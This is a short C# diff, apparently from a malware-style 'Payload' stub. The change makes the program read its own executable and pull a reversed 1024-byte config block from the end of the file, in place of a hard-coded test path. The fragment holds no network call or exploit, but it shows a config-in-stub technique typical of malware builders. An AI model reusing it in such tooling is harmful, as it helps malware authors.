@@ -97,8 +97,7 @@ namespace Payload
             {
                 try
                 {
-                    byte[] Stub = File.ReadAllBytes(@"C:\Users\amirreza\Desktop\123.exe");
-                    //byte[] Stub = File.ReadAllBytes(Application.ExecutablePath.ToString());
+                    byte[] Stub = File.ReadAllBytes(Application.ExecutablePath.ToString());
                     byte[] ConfigArry = new byte[1024];
                     Array.ConstrainedCopy(Stub, Stub.Length - 1024, ConfigArry, 0, 1024);
                     ConfigArry = Reverse(ConfigArry);
